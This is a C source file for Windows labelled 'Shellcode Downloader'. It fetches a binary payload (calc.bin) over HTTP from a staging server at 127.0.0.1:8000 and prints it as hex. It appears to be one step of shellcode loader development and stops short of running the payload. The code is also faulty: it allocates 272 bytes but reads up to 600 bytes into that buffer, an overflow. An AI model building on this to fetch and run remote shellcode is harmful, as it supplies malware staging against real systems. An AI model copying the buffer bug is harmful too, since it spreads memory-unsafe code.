#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <wininet.h>

#pragma comment(lib, "wininet.lib")  // Link against the wininet library

PBYTE pBytes;
DWORD dwBytesRead;

int main(int argc, char* argv[]) {

    // Open internet connection
    HINTERNET hInternet = InternetOpenW(L"Shellcode Downloader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
    if (!hInternet) {
        printf("We can't connect to the Internet error: %lx\n", GetLastError());
        return EXIT_FAILURE;
    }
    printf("Connection has been established\n");

    // Open the URL and retrieve the binary file (calc.bin)
    HINTERNET hUrl = InternetOpenUrlW(hInternet, L"http://127.0.0.1:8000/calc.bin", NULL, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
    if (!hUrl) {
        printf("We can't open the URL error: %lx\n", GetLastError());
        return EXIT_FAILURE;
    }
    printf("URL has been found\n");

    // Allocate memory to store the downloaded file (272 bytes as per your code)
    pBytes = (PBYTE)LocalAlloc(LPTR, 272);
    if (!pBytes) {
        printf("Memory allocation failed\n");
        return EXIT_FAILURE;
    }

    // Read the file from the URL
    if (!InternetReadFile(hUrl, pBytes, 600, &dwBytesRead)) {
        printf("Error reading file: %lx\n", GetLastError());
        LocalFree(pBytes);
        return EXIT_FAILURE;
    }

    // Close internet handles
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);

    // Print the contents of the file in hexadecimal format
    printf("Downloaded %lu bytes:\n", dwBytesRead);
    for (DWORD i = 0; i < dwBytesRead; i++) {
        printf("%02X ", pBytes[i]);
        if ((i + 1) % 16 == 0) printf("\n");  // Print 16 bytes per line for readability
    }

    printf("\n");

    // Free allocated memory
    LocalFree(pBytes);

    return EXIT_SUCCESS;
}
